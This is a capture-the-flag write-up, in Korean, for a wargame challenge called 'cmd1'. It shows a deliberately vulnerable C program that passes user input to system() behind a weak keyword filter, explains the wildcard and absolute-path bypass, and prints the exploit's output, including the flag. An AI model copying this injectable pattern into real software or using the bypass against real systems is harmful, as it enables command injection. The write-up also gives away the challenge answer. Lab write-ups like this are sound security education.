# cmd1

## cmd1.c
```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}
int main(int argc, char* argv[], char** envp){
	putenv("PATH=/thankyouverymuch");
	if(filter(argv[1])) return 0;
	system( argv[1] );
	return 0;
}
```

`argv[1]`에서 `flag`, `sh`, `tmp`를 필터링한다. `PATH` 환경변수도 변경해서 명령어를 사용할 때 절대경로를 이용해야 한다. `/bin/cat`과 `*` 와일드카드나 심볼릭링크를 이용하면 flag를 읽을 수 있다.

`./cmd1 /bin/cat *` 이렇게 하면 `argv[1]`에는 `/bin/cat`만 들어가게 되므로 더블 쿼터로 감싸줬다.

## exploit

```bash
cmd1@ubuntu:~$ ./cmd1 "/bin/cat *"
~~~
_libc_start_main@@GLIBC_2.2.5putenv@@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used__libc_csu_init_end_start__bss_startmain_Jv_RegisterClasses_initstrstr@@GLIBC_2.2.5#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}
int main(int argc, char* argv[], char** envp){
	putenv("PATH=/thankyouverymuch");
	if(filter(argv[1])) return 0;
	system( argv[1] );
	return 0;
}

mommy now I get what PATH environment is for :)
```